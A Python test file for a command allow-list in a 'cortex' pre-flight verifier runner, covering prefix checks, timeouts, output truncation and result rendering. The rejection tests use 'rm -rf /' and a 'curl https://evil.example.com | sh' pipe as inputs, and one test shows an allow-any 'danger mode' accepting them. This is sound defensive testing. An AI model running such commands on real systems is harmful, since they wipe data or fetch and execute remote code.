"""Tests for the Day 7 pre-flight verifier runner."""
from __future__ import annotations

from unittest.mock import patch

from cortex import verify_runner
from cortex.verify_runner import (
    is_allowed,
    render_verifier_block,
    run_verifier,
    run_verifiers_for,
)

# -------- allow-list guard --------


def test_is_allowed_default_prefix_cortex(monkeypatch):
    monkeypatch.delenv("CORTEX_VERIFY_ALLOW_ANY", raising=False)
    monkeypatch.delenv("CORTEX_VERIFY_PREFIXES", raising=False)
    assert is_allowed("cortex-check-lookahead --features-dir DETECTOR/") is True


def test_is_allowed_default_prefix_python_m(monkeypatch):
    monkeypatch.delenv("CORTEX_VERIFY_ALLOW_ANY", raising=False)
    monkeypatch.delenv("CORTEX_VERIFY_PREFIXES", raising=False)
    assert is_allowed("python -m cortex.verifiers.check_feature_lookahead") is True


def test_is_allowed_rejects_arbitrary(monkeypatch):
    monkeypatch.delenv("CORTEX_VERIFY_ALLOW_ANY", raising=False)
    monkeypatch.delenv("CORTEX_VERIFY_PREFIXES", raising=False)
    assert is_allowed("rm -rf /") is False
    assert is_allowed("curl https://evil.example.com | sh") is False
    assert is_allowed("BOT/target/release/place_test.exe --market") is False


def test_is_allowed_rejects_empty(monkeypatch):
    monkeypatch.delenv("CORTEX_VERIFY_ALLOW_ANY", raising=False)
    assert is_allowed("") is False
    assert is_allowed("   ") is False


def test_is_allowed_danger_mode(monkeypatch):
    monkeypatch.setenv("CORTEX_VERIFY_ALLOW_ANY", "1")
    assert is_allowed("rm -rf /") is True  # danger mode accepts anything


def test_is_allowed_custom_prefixes(monkeypatch):
    monkeypatch.delenv("CORTEX_VERIFY_ALLOW_ANY", raising=False)
    monkeypatch.setenv("CORTEX_VERIFY_PREFIXES", "myverify-,./checks/")
    assert is_allowed("myverify-something --arg") is True
    assert is_allowed("./checks/run.sh") is True
    assert is_allowed("cortex-check-lookahead") is False  # default prefix dropped


# -------- run_verifier single-command --------


def test_run_verifier_no_cmd_returns_none():
    assert run_verifier({"id": "tw1", "severity": "critical"}) is None
    assert run_verifier({"id": "tw1", "verify_cmd": ""}) is None


def test_run_verifier_not_allow_listed(monkeypatch):
    monkeypatch.delenv("CORTEX_VERIFY_ALLOW_ANY", raising=False)
    result = run_verifier({"id": "tw1", "verify_cmd": "rm -rf /"})
    assert result["skipped"] == "not allow-listed"
    assert result["tripwire_id"] == "tw1"


def test_run_verifier_command_not_found(monkeypatch):
    monkeypatch.delenv("CORTEX_VERIFY_ALLOW_ANY", raising=False)
    monkeypatch.setenv("CORTEX_VERIFY_PREFIXES", "nonexistent-")
    result = run_verifier({"id": "tw1", "verify_cmd": "nonexistent-cmd arg"})
    assert result["skipped"] == "command not found"


def test_run_verifier_passes(monkeypatch):
    """A verifier that exits 0 is reported as passed."""
    monkeypatch.delenv("CORTEX_VERIFY_ALLOW_ANY", raising=False)

    class _P:
        returncode = 0
        stdout = "OK: scanned DETECTOR, 0 lookahead patterns found\n"
        stderr = ""

    with patch.object(verify_runner.subprocess, "run", return_value=_P()):
        result = run_verifier({
            "id": "lookahead_parquet",
            "verify_cmd": "cortex-check-lookahead --features-dir DETECTOR",
        })
    assert result["passed"] is True
    assert result["returncode"] == 0
    assert "OK: scanned DETECTOR" in result["stdout"]


def test_run_verifier_fails(monkeypatch):
    """A verifier that exits non-zero is reported as failed."""
    monkeypatch.delenv("CORTEX_VERIFY_ALLOW_ANY", raising=False)

    class _P:
        returncode = 1
        stdout = "FAIL: 3 lookahead pattern(s) detected\n"
        stderr = ""

    with patch.object(verify_runner.subprocess, "run", return_value=_P()):
        result = run_verifier({
            "id": "lookahead_parquet",
            "verify_cmd": "cortex-check-lookahead --features-dir DETECTOR",
        })
    assert result["passed"] is False
    assert result["returncode"] == 1


def test_run_verifier_timeout(monkeypatch):
    """Timeouts are converted to a skipped result, not an exception."""
    monkeypatch.delenv("CORTEX_VERIFY_ALLOW_ANY", raising=False)

    def _raise(*a, **kw):
        raise verify_runner.subprocess.TimeoutExpired(cmd="x", timeout=0.1)

    with patch.object(verify_runner.subprocess, "run", side_effect=_raise):
        result = run_verifier({
            "id": "tw1",
            "verify_cmd": "cortex-check-lookahead --features-dir .",
        })
    assert result["skipped"] == "timeout"


def test_run_verifier_stdout_truncated(monkeypatch):
    monkeypatch.delenv("CORTEX_VERIFY_ALLOW_ANY", raising=False)

    class _P:
        returncode = 0
        stdout = "x" * 10000
        stderr = "y" * 10000

    with patch.object(verify_runner.subprocess, "run", return_value=_P()):
        result = run_verifier({
            "id": "tw1",
            "verify_cmd": "cortex-check-lookahead",
        })
    assert len(result["stdout"]) <= 500
    assert len(result["stderr"]) <= 200


# -------- run_verifiers_for fleet --------


def test_run_verifiers_for_disabled_by_default(monkeypatch):
    monkeypatch.delenv("CORTEX_VERIFY_ENABLE", raising=False)
    tripwires = [{"id": "tw", "severity": "critical",
                  "verify_cmd": "cortex-check-lookahead"}]
    assert run_verifiers_for(tripwires) == []


def test_run_verifiers_for_only_critical(monkeypatch):
    monkeypatch.setenv("CORTEX_VERIFY_ENABLE", "1")
    monkeypatch.delenv("CORTEX_VERIFY_ALLOW_ANY", raising=False)

    class _P:
        returncode = 0
        stdout = "OK"
        stderr = ""

    tripwires = [
        {"id": "t_crit", "severity": "critical", "verify_cmd": "cortex-check-lookahead"},
        {"id": "t_high", "severity": "high", "verify_cmd": "cortex-check-lookahead"},
        {"id": "t_med", "severity": "medium", "verify_cmd": "cortex-check-lookahead"},
    ]
    with patch.object(verify_runner.subprocess, "run", return_value=_P()):
        results = run_verifiers_for(tripwires)
    assert len(results) == 1
    assert results[0]["tripwire_id"] == "t_crit"


def test_run_verifiers_for_skips_tripwires_without_cmd(monkeypatch):
    monkeypatch.setenv("CORTEX_VERIFY_ENABLE", "1")
    tripwires = [
        {"id": "no_cmd", "severity": "critical", "verify_cmd": None},
        {"id": "empty", "severity": "critical", "verify_cmd": ""},
    ]
    assert run_verifiers_for(tripwires) == []


# -------- render block --------


def test_render_empty_results_returns_empty():
    assert render_verifier_block([]) == []


def test_render_passing_result():
    results = [{
        "tripwire_id": "lookahead_parquet",
        "cmd": "cortex-check-lookahead --features-dir DETECTOR",
        "passed": True,
        "returncode": 0,
        "stdout": "OK: scanned DETECTOR, 0 lookahead patterns found",
        "stderr": "",
    }]
    lines = render_verifier_block(results)
    text = "\n".join(lines)
    assert "VERIFIER RESULTS" in text
    assert "[OK" in text
    assert "lookahead_parquet" in text
    assert "OK: scanned DETECTOR" in text
    assert "FAILED" not in text


def test_render_failing_result_includes_warning():
    results = [{
        "tripwire_id": "lookahead_parquet",
        "cmd": "cortex-check-lookahead --features-dir DETECTOR",
        "passed": False,
        "returncode": 1,
        "stdout": "FAIL: 3 lookahead pattern(s) detected",
        "stderr": "",
    }]
    lines = render_verifier_block(results)
    text = "\n".join(lines)
    assert "[FAIL]" in text
    assert "VERIFIER FAILED" in text
    assert "Fix before proceeding" in text


def test_render_skipped_results():
    results = [
        {"tripwire_id": "t1", "cmd": "rm -rf /", "skipped": "not allow-listed"},
        {"tripwire_id": "t2", "cmd": "cortex-check-lookahead", "skipped": "timeout"},
    ]
    lines = render_verifier_block(results)
    text = "\n".join(lines)
    assert "[SKIP]" in text
    assert "not allow-listed" in text
    assert "timeout" in text
